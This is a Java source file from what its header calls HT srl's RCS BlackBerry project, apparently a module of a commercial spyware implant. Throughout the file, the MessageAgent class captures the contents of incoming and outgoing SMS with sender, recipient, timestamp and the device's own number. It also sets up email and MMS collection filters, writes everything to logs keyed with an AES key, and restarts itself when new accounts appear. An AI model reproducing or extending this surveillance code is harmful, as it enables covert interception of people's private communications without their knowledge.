//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Vector;

import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.AgentManager;
import blackberry.Status;
import blackberry.agent.mail.Filter;
import blackberry.agent.mail.MailListener;
import blackberry.agent.sms.SmsListener;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.log.TimestampMarkup;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato

 */

/**
 * The Class MessageAgent.
 */
public final class MessageAgent extends Agent implements SmsObserver {

    //#ifdef DEBUG
    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
    //#endif

    private static final int SMS_VERSION = 2010050501;

    protected static final int SLEEPTIME = 5000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    boolean mailEnabled;
    boolean smsEnabled;

    MailListener mailListener;
    SmsListener smsListener;

    TimestampMarkup markupDate;
    //public Date lastcheck = new Date(0);

    protected String identification;
    public IntHashtable filtersSMS = new IntHashtable();
    public IntHashtable filtersMMS = new IntHashtable();
    public IntHashtable filtersEMAIL = new IntHashtable();

    boolean firstRun;

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MessageAgent(final boolean agentEnabled) {
        super(AGENT_MESSAGE, agentEnabled, Conf.AGENT_MESSAGE_ON_SD,
                "MessageAgent");

        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
                "Wrong Conversion");
        //#endif

        mailListener = new MailListener(this);
        smsListener = SmsListener.getInstance();
        //smsListener.setMessageAgent(this);
    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);

        // mantiene la data prima di controllare tutte le email
        markupDate = new TimestampMarkup(agentId, Keys.getInstance()
                .getAesKey());

        parse(confParams);

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);
    }

    private static MessageAgent instance;

    public static MessageAgent getInstance() {
        if (instance == null) {
            instance = (MessageAgent) Status.getInstance().getAgent(
                    Agent.AGENT_MESSAGE);
        }
        return instance;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

        // Ogni ora viene verificato se i nomi degli account corrisponde
        // se non corrisponde, restart dell'agente.

        if (firstRun) {
            //#ifdef DEBUG
            debug.info("First Run");
            //#endif
            firstRun = false;
            //smsListener.run();
            // TODO: solo se mail e' enabled
            if (mailEnabled) {
                mailListener.run();
            }
        }

        if (mailEnabled && haveNewAccount()) {
            //#ifdef DEBUG
            debug.info("Restarting MessageAgent, new account");
            //#endif
            AgentManager.getInstance().reStart(agentId);
        }

    }

    private boolean haveNewAccount() {

        return mailListener.haveNewAccount();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        firstRun = true;
        //TODO: se gli sms sono disabilitati non far partire il listener.
        if (smsEnabled) {
            smsListener.addSmsObserver(this);
        }

        if (mailEnabled) {
            mailListener.start();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        if (smsEnabled) {
            smsListener.removeSmsObserver(this);
        }

        if (mailEnabled) {
            mailListener.stop();
        }
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     * @param logType
     */
    public void createLog(final byte[] additionalData, final byte[] content,
            final int logType) {

        //#ifdef DBC
        Check.requires(content != null, "createLog content null");
        Check.requires(log != null, "log null");
        //#endif

        synchronized (log) {
            log.createLog(additionalData, logType);
            log.writeLog(content);
            log.close();
        }

        //#ifdef DEBUG
        debug.trace("log created");
        //#endif
    }

    /*    *//**
     * Inits the markup.
     * 
     * @return the long
     */

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] conf) {

        final Vector tokens = tokenize(conf);
        if (tokens == null) {
            //#ifdef DEBUG
            debug.error("Cannot tokenize conf");
            //#endif
            return false;
        }

        final int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            final Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
            case Prefix.TYPE_IDENTIFICATION:
                // IDENTIFICATION TAG
                identification = WChar.getString(conf, token.payloadStart,
                        token.length, false);
                //#ifdef DEBUG
                debug.trace("Type 1: " + identification);
                //#endif
                break;
            case Prefix.TYPE_FILTER:
                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                try {
                    final Filter filter = new Filter(conf, token.payloadStart,
                            token.length);
                    if (filter.isValid()) {
                        switch (filter.classtype) {
                        case Filter.CLASS_EMAIL:
                            //#ifdef DEBUG
                            debug.info(filter.toString());
                            //#endif

                            mailEnabled = true;
                            if (filter.type == Filter.TYPE_COLLECT) {
                                //#ifdef DEBUG
                                debug.trace("Filter.TYPE_COLLECT!");
                                //#endif

                                final Date oldfrom = lastcheckGet("FilterFROM");
                                final Date oldto = lastcheckGet("FilterTO");

                                if (filter.fromDate.getTime() == oldfrom
                                        .getTime()
                                        && filter.toDate.getTime() == oldto
                                                .getTime()) {
                                    //#ifdef DEBUG
                                    debug.info("same Mail Collect Filter");
                                    //#endif
                                } else {
                                    //#ifdef DEBUG
                                    debug
                                            .warn("Changed collect filter, resetting markup");
                                    debug.trace("oldfrom: " + oldfrom);
                                    debug.trace("oldto: " + oldto);
                                    //#endif
                                    lastcheckReset();
                                    lastcheckSet("FilterFROM", filter.fromDate);
                                    lastcheckSet("FilterTO", filter.toDate);
                                }
                            }

                            //#ifdef DEBUG
                            debug.trace("put: " + filter.type);
                            //#endif
                            filtersEMAIL.put(filter.type, filter);

                            break;
                        case Filter.CLASS_MMS:
                            //#ifdef DEBUG
                            debug.info(filter.toString());
                            //#endif
                            filtersMMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_SMS:
                            //#ifdef DEBUG                            
                            debug.info(filter.toString());
                            //#endif
                            smsEnabled = true;
                            filtersSMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_UNKNOWN: // fall through
                        default:
                            //#ifdef DEBUG
                            debug.error("unknown classtype: "
                                    + filter.classtype);
                            //#endif
                            break;
                        }
                    }
                    //#ifdef DEBUG
                    debug.trace("Type 2: header valid: " + filter.isValid());
                    //#endif
                } catch (final Exception e) {
                    //#ifdef DEBUG
                    debug.error("Cannot filter " + e);
                    //#endif
                }
                break;

            default:
                //#ifdef DEBUG
                debug.error("Unknown type: " + token.type);
                //#endif
                break;
            }
        }

        return true;
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public synchronized void lastcheckSet(String key, Date date) {
        //#ifdef DEBUG
        debug.trace("Writing markup: " + key + " date: " + date);
        //#endif

        final MessageAgent agent = MessageAgent.getInstance();

        if (agent != null) {
            agent.markupDate.put(key, date);
        } else {
            markupDate.put(key, date);
        }

    }

    public synchronized Date lastcheckGet(String key) {

        //#ifdef DBC
        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
        //#endif

        Date date = markupDate.get(key);

        //#ifdef DEBUG
        debug.trace("getLastCheck: " + key + " = " + date);
        //#endif

        if (date == null) {
            date = new Date(0);
            markupDate.put(key, date);
        }
        return date;
    }

    public synchronized void lastcheckReset() {
        //#ifdef DEBUG
        debug.trace("lastcheckReset markupDate: " + markupDate);
        //#endif

        markupDate.removeMarkup();

        //lastcheck = new Date(0); 
    }

    public void onNewSms(final javax.wireless.messaging.Message message,
            final boolean incoming) {
        //#ifdef DBC
        Check.requires(message != null, "saveLog: null message");
        //#endif

        //#ifdef DEBUG
        debug.trace("saveLog: " + message);
        //#endif

        final byte[] dataMsg = getDataMessage(message);
        //#ifdef DBC
        Check.asserts(dataMsg != null, "saveLog: null dataMsg");
        //#endif

        //final ByteArrayOutputStream os = null;
        try {

            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;
            String address = message.getAddress();

            // Check if it's actually a sms

            final String prefix = "sms://";
            if (address.indexOf(prefix) == 0) {
                address = address.substring(prefix.length());
            } else {
                //#ifdef DEBUG
                debug.error("Not a sms");
                //#endif
                return;
            }

            if (address.indexOf(":") > 0) {
                //#ifdef DEBUG
                debug.warn("Probably a MMS");
                //#endif
                return;
            }

            // Filling fields

            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMyAddress();

            } else {
                from = getMyAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "saveLog: null filetime");
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
            databuffer.write(Utils.padByteArray(to.getBytes(), 16));

            //#ifdef DEBUG
            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
            debug.info("From: " + from + " To: " + to + " date: "
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength());
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length);
            //#endif

            // Creating log
            if (dataMsg != null) {
                createLog(additionalData, dataMsg, LogType.SMS_NEW);
                return;
            } else {
                //#ifdef DEBUG
                debug.error("data null");
                //#endif

                return;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveLog message: " + ex);
            //#endif
            return;
        }
    }

    /**
     * @param message
     * @param dataMsg
     * @return
     */
    private byte[] getDataMessage(final javax.wireless.messaging.Message message) {

        byte[] dataMsg = null;

        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text SMS: " + msg);
            //#endif

            dataMsg = WChar.getBytes(msg);

        } else if (message instanceof BinaryMessage) {
            dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        }
        return dataMsg;
    }

    private String getMyAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith("Unknown")) {
            return "local";
        }

        //#ifdef DBC
        Check
                .ensures(number.length() <= 16, "getMyAddress too long: "
                        + number);
        //#endif

        return number;
    }

}
